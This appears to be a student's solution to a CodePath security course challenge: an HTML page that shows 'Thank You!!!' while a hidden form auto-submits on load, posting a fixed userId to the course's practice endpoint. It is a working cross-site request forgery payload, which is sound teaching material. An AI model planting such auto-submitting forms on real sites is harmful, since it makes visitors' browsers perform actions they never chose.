@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodePath Cybersecurity Challenge Week 2 - CSRF 2</title>
+</head>
+<body>
+    <p>Thank You!!!</p>
+    <form name="goodForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+        <input type="hidden" name="userId" value="1e4cd9f57024b71cdd84aa27e130871fb2ea5690" />
+        <input type="submit"/>
+    </form>
+    <script> document.goodForm.submit(); </script>
+</body>
+</html>
